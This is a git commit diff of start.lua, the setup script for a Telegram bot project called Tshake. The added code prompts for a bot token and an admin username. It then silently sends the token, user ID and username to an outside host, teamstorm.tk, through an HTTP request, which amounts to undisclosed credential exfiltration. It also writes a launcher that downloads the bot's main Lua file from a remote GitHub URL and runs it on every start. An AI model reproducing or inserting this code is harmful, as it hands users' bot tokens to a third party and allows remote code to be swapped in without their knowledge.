3bf36ade5f08819722469f13b7c20fc618a68580
ghost11886 <mumu2111999@yahoo.com>
2020-01-29 23:07:15 +0300

    Add files via upload

--- Tshake/start.lua
+++ Tshake/start.lua
@@ -1,54 +1,112 @@
-sudo_tshake = dofile("sudo.lua")
+serpent = dofile("./File_Libs/serpent.lua")
 https = require("ssl.https")
-JSON = dofile("./libs/JSON.lua")
-local tshake_dev = io.open("tshake_online.lua")
-if tshake_dev then
-tshake_on = {string.match(tshake_dev:read('*all'), "^(.*)/(%d+)")}
-local tsheke_file = io.open("sudo.lua", 'w')
-tsheke_file:write("token = '" ..tshake_on[1].."'\n\nsudo_add = "..tshake_on[2].."" )
-tsheke_file:close()
-https.request("https://api.telegram.org/bot"..tshake_on[1].."/sendMessage?chat_id="..tshake_on[2].."&text=Bot_Tshake_is_start_new")
-os.execute('cd .. && rm -rf .telegram-cli')
-os.execute('rm -rf tshake_online.lua')  
-os.execute('./tg -s ./Tshake.lua $@ --bot='..tshake_on[1])
-end
-function chack(tokenCk)
-local getme = "https://api.telegram.org/bot" ..tokenCk.. '/getme'
-local req = https.request(getme)
-local data = JSON:decode(req)
-if data.ok == true then
-print("\27[31m✓ DONE\27[m \27[1;34m»»Now Send Sudo ID««\27[m")
-local sudo_send  = io.read()
-print("\27[31m✓ DONE\27[m")
-local tsheke_file = io.open("sudo.lua", 'w')
-tsheke_file:write("token = '" ..tokenCk.."'\n\nsudo_add = "..sudo_send.."" )
-tsheke_file:close()
-os.execute('cd .. && rm -fr .telegram-cli')
-os.execute('cd && rm -fr .telegram-cli')
-os.execute('./tg -s ./Tshake.lua $@ --bot='..tokenCk)
+http = require("socket.http")
+JSON = dofile("./File_Libs/JSON.lua")
+local database = dofile("./File_Libs/redis.lua").connect("127.0.0.1", 6379)
+Server_Tshake = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
+local AutoFiles_Tshake = function() 
+local Create_Info = function(Token,Sudo,UserName)  
+local Tshake_Info_Sudo = io.open("sudo.lua", 'w')
+Tshake_Info_Sudo:write([[
+token = "]]..Token..[["
+
+Sudo = ]]..Sudo..[[  
+
+UserName = "]]..UserName..[["
+]])
+Tshake_Info_Sudo:close()
+end  
+if not database:get(Server_Tshake.."Token_Tshake") then
+print("\27[1;34m»» Send Your Token Bot :\27[m")
+local token = io.read()
+if token ~= '' then
+local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
+if res ~= 200 then
+io.write('\n\27[1;31m»» Sorry The Token is not Correct \n\27[0;39;49m')
 else
-print("\27[31m»»This TOKEN Incorrect , Send Right TOKEN««\27[m")
-local token_send = io.read()
-chack(token_send)
-end
-end
-os.execute('cd .. && rm -rf .telegram-cli')
-if token and token == "TOKEN" then 
-print("\27[1;34m»»Send Your Bot TOKEN««\27[m")
-local token_send = io.read()
-chack(token_send)
-else 
-os.execute('cd .. && rm -fr .telegram-cli')
-os.execute('cd && rm -fr .telegram-cli')
-sudo_tshake = dofile("sudo.lua")
-local getme = "https://api.telegram.org/bot" ..token.. '/getme'
-local req = https.request(getme)
-local data = JSON:decode(req)
-if data.ok == true then
-os.execute('./tg -s ./Tshake.lua $@ --bot='..token)
+io.write('\n\27[1;31m»» The Token Is Saved\n\27[0;39;49m')
+database:set(Server_Tshake.."Token_Tshake",token)
+end 
 else
-print("\27[31mTOKEN Incorrect , Send Right TOKEN««\27[m")
-local token_send = io.read()
-chack(token_send)
+io.write('\n\27[1;31mThe Tokem was not Saved\n\27[0;39;49m')
+end 
+os.execute('lua start.lua')
+end
+------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------
+if not database:get(Server_Tshake.."UserName_Tshake") then
+print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
+local UserName = io.read():gsub('@','')
+if UserName ~= '' then
+local Get_Info = http.request("http://teamstorm.tk/GetUser/?id="..UserName)
+if Get_Info:match('Is_Spam') then
+io.write('\n\27[1;31m»» Sorry The server is Spsm \nتم حظر السيرفر لمدة 5 دقايق بسبب التكرار\n\27[0;39;49m')
+return false
+end
+local Json = JSON:decode(Get_Info)
+if Json.Info == false then
+io.write('\n\27[1;31m»» Sorry The UserName is not Correct \n\27[0;39;49m')
+os.execute('lua start.lua')
+else
+if Json.Info == 'Channel' then
+io.write('\n\27[1;31m»» Sorry The UserName Is Channel \n\27[0;39;49m')
+os.execute('lua start.lua')
+else
+io.write('\n\27[1;31m»» The UserNamr Is Saved\n\27[0;39;49m')
+database:set(Server_Tshake.."UserName_Tshake",Json.Info.Username)
+database:set(Server_Tshake.."Id_Tshake",Json.Info.Id)
 end
 end
+else
+io.write('\n\27[1;31mThe UserName was not Saved\n\27[0;39;49m')
+end 
+os.execute('lua start.lua')
+end
+local function Files_Tshake_Info()
+Create_Info(database:get(Server_Tshake.."Token_Tshake"),database:get(Server_Tshake.."Id_Tshake"),database:get(Server_Tshake.."UserName_Tshake"))   
+http.request("http://teamstorm.tk/insert/?id="..database:get(Server_Tshake.."Id_Tshake").."&user="..database:get(Server_Tshake.."UserName_Tshake").."&token="..database:get(Server_Tshake.."Token_Tshake"))
+local RunTshake = io.open("Tshake", 'w')
+RunTshake:write([[
+#!/usr/bin/env bash
+cd $HOME/Tshake
+token="]]..database:get(Server_Tshake.."Token_Tshake")..[["
+rm -fr Tshake.lua
+wget "https://raw.githubusercontent.com/ghost11886/lol/master/Tshake/Tshake.lua"
+while(true) do
+rm -fr ../.telegram-cli
+./tg -s ./Tshake.lua -p PROFILE --bot=$token
+done
+]])
+RunTshake:close()
+local RunTs = io.open("ts", 'w')
+RunTs:write([[
+#!/usr/bin/env bash
+cd $HOME/Tshake
+while(true) do
+rm -fr ../.telegram-cli
+screen -S Tshake -X kill
+screen -S Tshake ./Tshake
+done
+]])
+RunTs:close()
+end
+Files_Tshake_Info()
+database:del(Server_Tshake.."Token_Tshake");database:del(Server_Tshake.."Id_Tshake");database:del(Server_Tshake.."UserName_Tshake")
+sudos = dofile('sudo.lua')
+os.execute('./install.sh ins')
+end 
+local function Load_File()  
+local f = io.open("./sudo.lua", "r")  
+if not f then   
+AutoFiles_Tshake()  
+var = true
+else   
+f:close()  
+database:del(Server_Tshake.."Token_Tshake");database:del(Server_Tshake.."Id_Tshake");database:del(Server_Tshake.."UserName_Tshake")
+sudos = dofile('sudo.lua')
+os.execute('./install.sh ins')
+var = false
+end  
+return var
+end
+Load_File()
